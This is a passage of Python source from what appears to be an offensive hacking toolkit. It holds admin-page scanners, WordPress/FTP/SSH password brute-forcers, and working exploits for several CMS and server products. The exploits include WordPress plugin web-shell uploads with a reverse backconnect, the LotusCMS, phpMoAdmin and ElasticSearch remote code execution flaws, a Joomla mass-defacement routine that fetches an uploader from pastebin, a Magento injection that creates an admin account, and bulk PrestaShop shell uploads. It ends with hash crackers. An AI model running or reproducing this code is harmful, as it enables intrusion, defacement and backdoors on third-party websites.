    'admin_area/index.brf','bb-admin/index.brf','bb-admin/login.brf','bb-admin/admin.brf','admin/home.brf','admin_area/login.html','admin_area/index.html',
    'admin/controlpanel.brf','admin.brf','admincp/index.asp','admincp/login.asp','admincp/index.html','admin/account.html','adminpanel.html','webadmin.html',
    'webadmin/index.html','webadmin/admin.html','webadmin/login.html','admin/admin_login.html','admin_login.html','panel-administracion/login.html',
    'admin/cp.brf','cp.brf','administrator/index.brf','administrator/login.brf','nsw/admin/login.brf','webadmin/login.brfbrf','admin/admin_login.brf','admin_login.brf',
    'administrator/account.brf','administrator.brf','acceso.brf','admin_area/admin.html','pages/admin/admin-login.brf','admin/admin-login.brf','admin-login.brf',
    'bb-admin/index.html','bb-admin/login.html','bb-admin/admin.html','admin/home.html','login.brf','modelsearch/login.brf','moderator.brf','moderator/login.brf',
    'moderator/admin.brf','account.brf','pages/admin/admin-login.html','admin/admin-login.html','admin-login.html','controlpanel.brf','admincontrol.brf',
    'admin/adminLogin.html','adminLogin.html','admin/adminLogin.html','home.html','rcjakar/admin/login.brf','adminarea/index.html','adminarea/admin.html',
    'webadmin.brf','webadmin/index.brf','webadmin/admin.brf','admin/controlpanel.html','admin.html','admin/cp.html','cp.html','adminpanel.brf','moderator.html',
    'administrator/index.html','administrator/login.html','user.html','administrator/account.html','administrator.html','login.html','modelsearch/login.html',
    'moderator/login.html','adminarea/login.html','panel-administracion/index.html','panel-administracion/admin.html','modelsearch/index.html','modelsearch/admin.html',
    'admincontrol/login.html','adm/index.html','adm.html','moderator/admin.html','user.brf','account.html','controlpanel.html','admincontrol.html',
    'panel-administracion/login.brf','wp-login.brf','adminLogin.brf','admin/adminLogin.brf','home.brf','admin.brf','adminarea/index.brf',
    'adminarea/admin.brf','adminarea/login.brf','panel-administracion/index.brf','panel-administracion/admin.brf','modelsearch/index.brf',
    'modelsearch/admin.brf','admincontrol/login.brf','adm/admloginuser.brf','admloginuser.brf','admin2.brf','admin2/login.brf','admin2/index.brf','usuarios/login.brf',
    'adm/index.brf','adm.brf','affiliate.brf','adm_auth.brf','memberadmin.brf','administratorlogin.brf']
    def php_admin(self,url):
		php = self.php
		for admin in php:
			admin=admin.strip()
			full = url+"/"+admin
			r = requests.get(full,verify=False)
			get = r.status_code
			if get == 200:
				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
			elif get == 403:
				print (color.R+color.BOLD+"{-}"+color.BOLD+" Forbidden          : "+color.ENDC+full)
			elif get == 302:
				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Redirect           : "+color.ENDC+full)
			elif get==404:
				print (color.W+color.BOLD+"{-}"+color.BOLD+" Not Found          : "+color.ENDC+full)
			else:
				print (color.W+color.BOLD+"{-} Response "+str(get)+"       : "+full)
    def asp_admin(self,url):
		asp = self.asp
		for admin in asp:
			admin=admin.strip()
			full = url+"/"+admin
			r = requests.get(full,verify=False)
			get = r.status_code
			if get == 200:
				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
			elif get == 403:
				print (color.R+color.BOLD+"{-}"+color.BOLD+" Forbidden          : "+color.ENDC+full)
			elif get == 302:
				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Redirect           : "+color.ENDC+full)
			elif get==404:
				print (color.W+color.BOLD+"{-}"+color.BOLD+" Not Found          : "+color.ENDC+full)
			else:
				print (color.W+color.BOLD+"{-} Response "+str(get)+"       : "+full)

    def cfm_admin(self,url):
		cfm = self.cfm
		for admin in cfm:
			admin=admin.strip()
			full = url+"/"+admin
			r = requests.get(full,verify=False)
			get = r.status_code
			if get == 200:
				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
			elif get == 403:
				print (color.R+color.BOLD+"{-}"+color.BOLD+" Forbidden          : "+color.ENDC+full)
			elif get == 302:
				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Redirect           : "+color.ENDC+full)
			elif get==404:
				print (color.W+color.BOLD+"{-}"+color.BOLD+" Not Found          : "+color.ENDC+full)
			else:
				print (color.W+color.BOLD+"{-} Response "+str(get)+"       : "+full)

    def js_admin(self,url):
		js = self.js
		for admin in js:
			admin=admin.strip()
			full = url+"/"+admin
			r = requests.get(full)
			get = r.status_code
			if get == 200:
				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
			elif get == 403:
				print (color.R+color.BOLD+"{-}"+color.BOLD+" Forbidden          : "+color.ENDC+full)
			elif get == 302:
				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Redirect           : "+color.ENDC+full)
			elif get==404:
				print (color.W+color.BOLD+"{-}"+color.BOLD+" Not Found          : "+color.ENDC+full)
			else:
				print (color.W+color.BOLD+"{-} Response "+str(get)+"       : "+full)

    def cgi_admin(self,url):
		cgi = self.cgi
		for admin in cgi:
			admin=admin.strip()
			full = url+"/"+admin
			r = requests.get(full,verify=False)
			get = r.status_code
			if get == 200:
				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
			elif get == 403:
				print (color.R+color.BOLD+"{-}"+color.BOLD+" Forbidden          : "+color.ENDC+full)
			elif get == 302:
				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Redirect           : "+color.ENDC+full)
			elif get==404:
				print (color.W+color.BOLD+"{-}"+color.BOLD+" Not Found          : "+color.ENDC+full)
			else:
				print (color.W+color.BOLD+"{-} Response "+str(get)+"       : "+full)

    def brf_admin(self,url):
		brf = self.brf
		for admin in brf:
			admin=admin.strip()
			full = url+"/"+admin
			r = requests.get(full,verify=False)
			get = r.status_code
			if get == 200:
				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Admin Page Found ! : "+color.ENDC+full)
			elif get == 403:
				print (color.R+color.BOLD+"{-}"+color.BOLD+" Forbidden          : "+color.ENDC+full)
			elif get == 302:
				print (color.Y+color.BOLD+"{+}"+color.BOLD+" Redirect           : "+color.ENDC+full)
			elif get==404:
				print (color.W+color.BOLD+"{-}"+color.BOLD+" Not Found          : "+color.ENDC+full)
			else:
				print (color.W+color.BOLD+"{-} Response "+str(get)+"       : "+full)

###
###BRUTEFORCING TOOLS
###
####################################
##                                ##
##   BruteForcing WP/JM/FTP/SSH   ##
##                                ##
####################################

class BruteForce:
	def wordpress(self, url, username,wordlist):
		headers = {
		'user-agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0'
		}
		#ok = time.strftime("%H:%M:%S")
		time.ctime()
		ok = time.strftime('%H:%M:%S')
		datetime = '['+ok+']'

		urll = "http://"+url+"/wp-login.php"
		if not requests.get(urll,verify=False).status_code == 200:
			print ("Error with  : "+url+"\nResponse is : "+str(requests.get(url,verify=False).status_code))
			return 1
		print (color.G+datetime+color.ENDC+" Starting Attack ! ")
		print (color.G+datetime+color.W+" wordpress  : "+color.Y+url)
		word = open(wordlist, 'r')
		word = word.readlines()
		for words in word:
			words = words.strip()
			
			payload = {'log' : username,
			           'pwd' : words}
			
			s = requests.post(urll,verify=False,data=payload, headers=headers)
			print (color.R+"------------------------------------------------------------------")
			print (color.G+datetime+color.W+" username   : "+color.Y+payload['log'])
			print (color.G+datetime+color.W+" password   : "+color.Y+payload['pwd'])
			if "wp-admin" in s.url or "Dashboard" in s.content:
				print (color.G+datetime+color.R+" Login Succes"+color.ENDC)
				print (color.R+"------------------------------------------------------------------"+color.ENDC)			
				break
			elif "wp-login.php" in s.url:
				print (color.G+datetime+color.C+" Login False"+color.ENDC)
	def ftp_brute(self,hostname, username, password):
		try:
			ftp = FTP(hostname)
			login = ftp.login(username, password)
			if "230" in login:
				print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" LOGIN SUCCESSFULLY WITH"+color.ENDC)
				print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Password : "+password+color.ENDC)
				sys.exit(0)
		except ftplib.error_perm:
			print (color.R+color.BOLD+"{-}"+color.ENDC+color.BOLD+" Error via Password : "+password+color.ENDC)
			pass
	def ssh_brute(self,hostname, username, password):
		try:
			s = pxssh.pxssh()
			login = s.login(hostname, username, password)
			if login == True:
				print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" LOGIN SUCCESSFULLY WITH"+color.ENDC)
				print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Password : "+password+color.ENDC)
		except pexpect.pxssh.ExceptionPxssh:
			print (color.R+color.BOLD+"{-}"+color.ENDC+color.BOLD+" Error via Password : "+password+color.ENDC)
			pass

###
###RCE EXPLOIT
###
####################################
##                                ##
##    Add RCE joomla & Magento    ##
##                                ##
####################################

class exploit:
	def wp_nmedia(self, target, host, port):
		def php_encoder():
			f = open("/opt/blackbox/payload/pmo.php", "r").read()
			f = f.replace("<?php", "")
			f = f.replace("?>", "")
			encoded = f.encode('base64')
			encoded = encoded.replace("\n", "")
			encoded = encoded.strip()
			code = "eval(base64_decode('%s'));" %(encoded)
			return code
		def shell_upload(url):
			target_url = url + "/wp-admin/admin-ajax.php"
			try:
				print "\x1b[1;32m{+} Using target URL of: %s\x1b[0m" %(target_url)    
				data = {"action": "upload", "action": "nm_webcontact_upload_file"}
				r = requests.post(url=target_url, data=data, files={"Filedata":("pwn.php", "<?php @assert(filter_input(0,woot,516)); ?>")})
			except Exception, e:
				sys.exit("\x1b[1;31m{-} Exception hit, printing stack trace...\n%s\x1b[0m" %(str(e)))
				if r.text:
					return r.text.strip()
				else:
					sys.exit("\x1b[1;31m{-} Something fucked up... Our shell was not uploaded :/\x1b[0m")
		def spawn_backconnect(shell_url, payload, host, port):
			cookies = {'host': host, 'port': port}
			data = {'woot': payload}
			headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
			try:
				print "\x1b[1;32m{*} Sending our payload...\x1b[0m"
				r = requests.post(url=shell_url, data=data, headers=headers, verify=False, cookies=cookies)
			except Exception, e:
				sys.exit("\x1b[1;31m{-} Exception hit, printing stack trace...\n%s\x1b[0m" %(str(e)))
			if r.text:
				print r.text
		def pop_shell(target, code, host, port):
			shell_key = shell_upload(url=target)
			shell_dict = json.loads(shell_key)
			shell_name = shell_dict['filename']
			shell_url = "%s/wp-content/uploads/contact_files/%s" %(target, shell_name)
			print "\x1b[1;32m{+} Our shell is at: %s\x1b[0m" %(shell_url)
			try:
				print "\x1b[1;36m{*} Sending Backconnect to %s:%s...\x1b[0m" %(host, port)
				spawn_backconnect(shell_url=shell_url, payload=code, host=host, port=port)
			except Exception, e:
				sys.exit("\x1b[1;31m{-} Exception hit, printing stack trace...\n%s\x1b[0m" %(str(e)))
		code=php_encoder()
		pop_shell(target=target, code=code, host=host, port=port)
	def wp_shop(self, target, code, cb_host, cb_port):
		def php_encoder():
			f = open("/opt/blackbox/payload/pmo.php", "r").read()
			f = f.replace("<?php", "")
			f = f.replace("?>", "")
			encoded = f.encode('base64')
			encoded = encoded.replace("\n", "")
			encoded = encoded.strip()
			code = "eval(base64_decode('%s'));" %(encoded)
			return code
		def shell_upload(url):
			target_url = url + "/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload"
			try:
				print "\x1b[1;32m{+} Using target URL of: %s\x1b[0m" %(target_url)    
				r = requests.post(url=target_url, files={"wpshop_file":("test.php", "<?php @assert(filter_input(0,woot,516)); ?>")})
			except Exception, e:
				sys.exit("\x1b[1;31m{-} Exception hit, printing stack trace...\n%s\x1b[0m" %(str(e)))
			if r.text:
				return r.text.strip()
			else:
				sys.exit("\x1b[1;31m{-} Something fucked up... Our shell was not uploaded :/\x1b[0m")
		def spawn_backconnect(shell_url, payload, cb_host, cb_port):
			cookies = {'host': cb_host, 'port': cb_port}
			data = {'woot': payload}
			headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
			try:
				print "\x1b[1;32m{*} Sending our payload...\x1b[0m"
				r = requests.post(url=shell_url, data=data, headers=headers, verify=False, cookies=cookies)
			except Exception, e:
				sys.exit("\x1b[1;31m{-} Exception hit, printing stack trace...\n%s\x1b[0m" %(str(e)))
			if r.text:
				print r.text
		def pop_shell(target, code, cb_host, cb_port):
			shell_url = shell_upload(url=target)
			print "\x1b[1;32m{+} Our shell is at: %s\x1b[0m" %(shell_url)
			try:
				print "\x1b[1;36m{*} Sending Backconnect to %s:%s...\x1b[0m" %(cb_host, cb_port)
				spawn_backconnect(shell_url=shell_url, payload=code, cb_host=cb_host, cb_port=cb_port)
			except Exception, e:
				sys.exit("\x1b[1;31m{-} Exception hit, printing stack trace...\n%s\x1b[0m" %(str(e)))
		pop_shell(target=target, code=code, cb_host=host, cb_port=port)

	def lotuscms(self, target, cb_host, cbport):
		def php_encoder():
			f = open("/opt/blackbox/payload/lotuscms.php", "r").read()
			f = f.replace("<?php", "")
			f = f.replace("?>", "")
			encoded = f.encode('base64')
			encoded = encoded.replace("\n", "")
			encoded = encoded.strip()
			code = "eval(base64_decode('%s'));" %(encoded)
			return code
		def pop_shell(target, code, cb_host, cb_port):
			cookies = {'host': cb_host, 'port': cb_port}
			data = {'0': code}
			headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
			stager = "/index.php?page=index%27%29%3B%24{eval($_POST[0])}%3B%23"
			print "{+} Sending our payload..."
			try:
				r = requests.post(url=target+stager, data=data, headers=headers, verify=False, cookies=cookies)
			except Exception, e:
				sys.exit("[-] Exception hit! Printing:\n %s" %(str(e)))
			if r.text:
				print r.text.split("</html>")[1].rstrip()
		code = php_encoder()
		pop_shell(target,code, cb_host, cb_port)

	def phpmoadmin(self, target, cb_host, cbport):
		"""Exploit for phpMoAdmin, CVE-2015-2208"""
		def php_encoder():
			f = open("/opt/blackbox/payload/pma.php", "r").read()
			f = f.replace("<?php", "")
			f = f.replace("?>", "")
			encoded = f.encode('base64')
			encoded = encoded.replace("\n", "")
			encoded = encoded.strip()
			code = "eval(base64_decode('%s'));" %(encoded)
			return code
		def pop_shell(target, code, cb_host, cb_port):
			print "{+} Sending Payload..."
			cookies = {'host': cb_host, 'port': cb_port}
			post_data = {"object": "1;%s;exit" %(code)}
			headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
			try:
				r = requests.post(url=target, data=post_data, headers=headers, verify=False, cookies=cookies)
			except Exception, e:
				sys.exit("[-] Exception hit! Printing:\n %s" %(str(e)))
			if r.text:
				print r.text.strip()
		code = php_encoder()
		pop_shell(target, code, cb_host, cb_port)

	def elastic(self, target):
		"""Exploit for ElasticSearch , {CVE-2015-1427}"""
		def execute_command(target, command):
			payload = """{"size":1, "script_fields": {"lupin":{"script": "java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"%s\\").getText()"}}}""" %(command)
			try:
				url = "http://%s:9200/_search?pretty" %(target)
				r = requests.post(url=url, data=payload)
			except Exception, e:
				sys.exit("Exception Hit"+str(e))
			values = json.loads(r.text)
			fuckingjson = values['hits']['hits'][0]['fields']['lupin'][0]
			print fuckingjson.strip()
		def exploit(target):
			print "{*} Spawning Shell on target... Do note, its only semi-interactive... Use it to drop a better payload or something"
			while True:
				cmd = raw_input("~$ ")
				if cmd == "exit":
					sys.exit("{!} Shell exiting!")
				else:
					execute_command(target, cmd)
		exploit(target)
	def joomla(self, wordlist):
		wordlist = open(wordlist, "r")
		def get_url(url, user_agent):
			headers = {
			'User-Agent': user_agent
			}
			cookies = requests.get(url,verify=False,headers=headers).cookies
			for _ in range(3):
				response = requests.get(url,verify=False, headers=headers,cookies=cookies)    
			return response.content
		def php_str_noquotes(data):
			encoded = ""
			for char in data:
				encoded += "chr({0}).".format(ord(char))
			return encoded[:-1]
		def generate_payload(php_payload):
			php_payload = "eval({0})".format(php_str_noquotes(php_payload))
			terminate = '\xf0\xfd\xfd\xfd';
			exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
			injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
			exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
			exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
			return exploit_template
		pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/up.php','w+'),file_get_contents('http://pastebin.com/raw/uWVsQH53')); fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/x.htm','w+'),'Hacked by Black Eye');")
		for i in wordlist.readlines():
			i=i.strip()
			get_url(i, pl)
			lala=requests.get(i+"/x.htm",verify=False)
			if "Hacked" in lala.content:
				print i+"/x.htm  : Defaced | /up.php uploader file "
				z=open('Joomla_3.5_Shell.txt','a')
				z.write(i+"/x.htm\n")
				z.close()
			else:
				print i+" : Not Defaced"
		wordlist.close()

	def magento(self, wordlist):
		wordlist = open(wordlist, "r")
		for site in wordlist.readlines():
			site = site.strip()
			target_url = site + "/admin/Cms_Wysiwyg/directive/index/"
			if not target_url.startswith("http"):
				target_url = "http://" + target_url
			if target_url.endswith("/"):
				target_url = target_url[:-1]
			q="""
			SET @SALT = 'rp';
			SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
			SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
			INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
			INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');"""
			query = q.replace("\n", "").format(username="form", password="form")
			pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
			# e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
			r = requests.post(target_url,
				data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
				"filter": base64.b64encode(pfilter),
				"forwarded": 1})
			if r.ok:
				print "{0}/admin with login : form:form".format(target_url)
			else:
				print "NOT WORKED with {0}".format(target_url)
	def presta_run(self, lists, script):
		###
		### SimpleSlideShow Exploit
		###
		def sss_ex(lists, script):
			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"SimpleSlideShow Exploit :"+color.ENDC)
			lists = open(lists,"r")
			lists = lists.readlines()
			for url in lists:
				url=url.strip()
				url = url + "/modules/simpleslideshow/uploadimage.php"
				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
				req=requests.post(url,files=files)
				url=url.replace('/uploadimage.php','/slides/'+script)
				if 'uploadshell' in req.text:
					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
				else:
					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
		###
		### productpageadverts
		###
		def ppa_ex(lists, script):
			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"Productpageadverts Exploit :"+color.ENDC)
			lists = open(lists,"r")
			lists = lists.readlines()
			for url in lists:
				url=url.strip()
				url = url + "/modules/productpageadverts/uploadimage.php"
				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
				req=requests.post(url,files=files)
				url=url.replace('/uploadimage.php','/slides/'+script)
				if 'uploadshell' in req.text:
					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
				else:
					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
		###
		### HomePageAdvertise
		###
		def hpa_ex(lists, script):
			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"HomePageAdvertise Exploit :"+color.ENDC)
			lists = open(lists,"r")
			lists = lists.readlines()
			for url in lists:
				url=url.strip()
				url = url + "/modules/homepageadvertise/uploadimage.php"
				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
				req=requests.post(url,files=files)
				url=url.replace('/uploadimage.php','/slides/'+script)
				if 'uploadshell' in req.text:
					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
				else:
					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
		###
		### ColumnAdvers
		###
		def ca_ex(lists, script):
			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"ColumnAdvers Exploit :"+color.ENDC)
			lists = open(lists,"r")
			lists = lists.readlines()
			for url in lists:
				url=url.strip()
				url = url + "/modules/columnadverts/uploadimage.php"
				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
				req=requests.post(url,files=files)
				url=url.replace('/uploadimage.php','/slides/'+script)
				if 'uploadshell' in req.text:
					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
				else:
					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
		###
		### vtemslideshow
		###
		def vtss_ex(lists, script):
			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"Vtemslideshow Exploit :"+color.ENDC)
			lists = open(lists,"r")
			lists = lists.readlines()
			for url in lists:
				url=url.strip()
				url = url + "modules/vtemslideshow/uploadimage.php"
				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
				req=requests.post(url,files=files)
				url=url.replace('/uploadimage.php','/slides/'+script)
				if 'uploadshell' in req.text:
					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
				else:
					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
		###
		### attributewizardpro
		###
		def awp_ex(lists, script):
			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"Attributewizardpro Exploit :"+color.ENDC)
			lists = open(lists,"r")
			lists = lists.readlines()
			for url in lists:
				url=url.strip()
				url = url + "/modules/attributewizardpro/file_upload.php"
				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
				req=requests.post(url,files=files)
				url=url.replace('/uploadimage.php','/slides/'+script)
				if 'uploadshell' in req.text:
					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
				else:
					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
		###
		### additionalproductstabs
		###
		def aps_ex(lists, script):
			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"Additionalproductstabs Exploit :"+color.ENDC)
			lists = open(lists,"r")
			lists = lists.readlines()
			for url in lists:
				url=url.strip()
				url = url + "/modules/additionalproductstabs/file_upload.php"
				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
				req=requests.post(url,files=files)
				url=url.replace('/uploadimage.php','/slides/'+script)
				if 'uploadshell' in req.text:
					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
				else:
					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
		###
		### addthisplugin
		###
		def atp_ex(lists, script):
			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"Addthisplugin Exploit :"+color.ENDC)
			lists = open(lists,"r")
			lists = lists.readlines()
			for url in lists:
				url=url.strip()
				url = url + "/modules/addthisplugin/file_upload.php"
				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
				req=requests.post(url,files=files)
				url=url.replace('/uploadimage.php','/slides/'+script)
				if 'uploadshell' in req.text:
					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
				else:
					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
		###
		### advancedslider
		###
		def as_ex(lists, script):
			print (color.M+color.BOLD+"{+} "+color.ENDC+color.BOLD+"Advancedslider Exploit :"+color.ENDC)
			lists = open(lists,"r")
			lists = lists.readlines()
			for url in lists:
				url=url.strip()
				url = url + "/modules/advancedslider/file_upload.php"
				files={'userfile':(script, open(script,'rb'),'multipart/form-data')}
				req=requests.post(url,files=files)
				url=url.replace('/uploadimage.php','/slides/'+script)
				if 'uploadshell' in req.text:
					print (url+" :"+color.BL+color.BOLD+" UPLOADED")
				else:
					print (url+" :"+color.R+color.BOLD+" ERROR"+color.ENDC)
		l = open(lists,"r")
		l = l.readlines()
		print (color.M+color.BOLD+"{+}"+color.BOLD+color.W+" "+str(len(l))+" URL FOUNDED")
		#Start SimpleSlideShow Exploit
		sss_ex(lists, script)
		#Start productpageadverts Exploit
		ppa_ex(lists, script)
		#Start HomePageAdvertise Exploit
		hpa_ex(lists, script)
		#Start ColumnAdvers Exploit
		ca_ex(lists, script)
		#Start vtemslideshow Exploit
		vtss_ex(lists, script)
		#Start attributewizardpro Exploit
		awp_ex(lists, script)
		#Start additionalproductstabs
		aps_ex(lists, script)
		#Start addthisplugin
		atp_ex(lists, script)
		#Start advancedslider
		as_ex(lists, script)
		#FINISH !
		print (color.M+color.BOLD+"{+} "+color.BOLD+color.W+"END OF ATTACK")


###
###DNS INFO
###
####################################
##                                ##
##      Get Website from IP       ##
##                                ##
####################################

class dnsinfo:
	def yougetsignal(self, ip):
		def Details():
			yougetsignal = 'http://domains.yougetsignal.com/domains.php'
			data = {
			'remoteAddress': ip,
			'key'          : ''}
			headers={
			'User-Agent'  : 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
			get = requests.post(yougetsignal, data=data, headers=headers)
			get = get.text
			ok = json.loads(get)
			return ok
		
		def rzlt(details):
			print (color.G+"Domains Hosted : "+color.W+color.BOLD+details['domainCount']+color.ENDC)
			print (color.G+"IP Address     : "+color.W+color.BOLD+details['remoteIpAddress']+color.ENDC)
			print (color.G+"Remote Address : "+color.W+color.BOLD+details['remoteAddress']+color.ENDC)
			ipp = details['remoteIpAddress']
			rzt = open(ipp+".txt" ,'a')
			for domains,bl in details['domainArray']:
				rzt.write(domains+"\n")
			rzt.close
			print (color.W+color.BOLD+"Domains is saved in "+ipp+".txt"+color.ENDC)
		details = Details()
		rzlt(details)
	def viewdns(self,ip):
		url = "http://viewdns.info/reverseip/?host="+ip+"&t=1"
		headers = {
		'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1'  
		}
		r = requests.get(url, headers=headers)
		text =  r.content
		sites = re.findall(r"<tr>\s+<td>(.*?)</td><td align=", text)
		ipp = open(ip+".txt" ,'a')
		for i in sites:
			i=i.strip()
			ipp.write(i+"\n")
		print (color.W+color.BOLD+"{+} "+str(len(sites))+" FOUND"+color.ENDC)
		print (color.W+color.BOLD+"{+} Domains is saved in "+ip+".txt"+color.ENDC)
	def hackertarget(self,domain):
		urll = []
		url = "http://api.hackertarget.com/reverseiplookup/?q="+domain
		get = requests.get(url)
		html = get.content
		if "No records found for" in html:
			print"No Websites Found At "+domain
		else:
			black = re.findall(r'(.*)', html)
			black = ' '.join(black).split()
			ipp = open(domain+".txt" ,'a')
			for i in black:
				i = i.strip()
				urll.append(i)
				ipp.write(i+"\n")
			print (color.W+color.BOLD+"{+} "+str(len(black))+" FOUND"+color.ENDC)
			print (color.W+color.BOLD+"{+} Domains is saved in "+domain+".txt"+color.ENDC)

###
###HASH CRACKER
###
####################################
##                                ##
##         HASH CRACKER           ##
##                                ##
####################################
class cracker:
	def md5(self, md5, wordlist):
		start = timeit.default_timer()
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" MD5 HASH PATH : "+wordlist+color.ENDC)
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH : "+md5+color.ENDC)
		wordlist = open(wordlist, "r")
		word = wordlist.readlines()
		md5 = open(md5, "r")
		md5 = md5.readlines()
		var = 0
		for i in word:
			i=i.strip()
			for o in md5:
				o=o.strip()
				wordlistmd5 = hashlib.md5(o).hexdigest()
				if i==wordlistmd5:
					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
					var+=1
		if var==0:
			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
		else:
			pass
		stop = timeit.default_timer()
		print (color.BL+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Elapsed Time : "+str(stop - start)+"s"+color.ENDC)

	def sha1(self, sha1, wordlist):
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" SHA1 HASH PATH : "+wordlist+color.ENDC)
		print (color.Y+color.BOLD+"{+}"+color.ENDC+color.BOLD+" WORDLIST PATH  : "+sha1+color.ENDC)
		start = timeit.default_timer()
		wordlist = open(wordlist, "r")
		word = wordlist.readlines()
		sha1 = open(sha1, "r")
		sha1 = sha1.readlines()
		var=0
		for i in word:
			i=i.strip()
			for o in sha1:
				o=o.strip()
				wordlistsha1 = hashlib.sha1(o).hexdigest()
				if i==wordlistsha1:
					print (color.G+color.BOLD+"{+}"+color.ENDC+color.BOLD+" Hash Found :\n"+color.G+color.BOLD+"{+} "+color.ENDC+color.BOLD+o+" : "+i+color.ENDC)
					var+=1
		if var==0:
			print color.R+color.BOLD+"{-}"+color.W+" HASH NOT FOUND!"+color.ENDC
		else:
			pass		
